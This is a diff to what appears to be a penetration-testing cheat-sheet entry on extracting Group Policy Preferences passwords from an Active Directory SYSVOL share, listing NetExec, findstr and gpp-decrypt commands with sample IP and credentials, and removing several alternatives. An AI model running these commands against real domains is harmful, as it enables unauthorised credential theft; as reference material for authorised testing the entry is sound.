@@ -4,27 +4,8 @@ description: |
 commands:
   - have: Credentials
     cmd: |
-      # Browse SYSVOL for GPP XML files
-      smbclient //10.10.10.27/SYSVOL -U sec_user%'P@ssw0rd'
-
-      # Search SYSVOL for cpassword entries
-      findstr /S cpassword \\10.10.10.27\sysvol\*.xml
-
-      # Decrypt GPP cpassword string
-      gpp-decrypt "encrypted_cpassword_string"
-
-      # NetExec — automated GPP password extraction
       nxc smb 10.10.10.27 -u sec_user -p 'P@ssw0rd' -M gpp_password
-
-      # PowerShell — Get-GPPPassword from domain-joined host
-      Import-Module .\Get-GPPPassword.ps1
-      Get-GPPPassword
-  - have: Shell
-    cmd: |
-      # Search SYSVOL from domain-joined host
-      findstr /S cpassword \\senshu.sh\sysvol\senshu.sh\Policies\*.xml
-
-      # Decrypt found cpassword value
+      findstr /S cpassword \\10.10.10.27\sysvol\*.xml
       gpp-decrypt "encrypted_cpassword_string"
 phase:
   - Post-Exploitation
@@ -33,7 +14,7 @@ target_os:
 services:
   - SMB
 techniques:
-  - GPP_Passwords
+  - Credential_Theft
 references:
   - https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/acl-persistence-abuse/index.html
   - https://www.netexec.wiki/
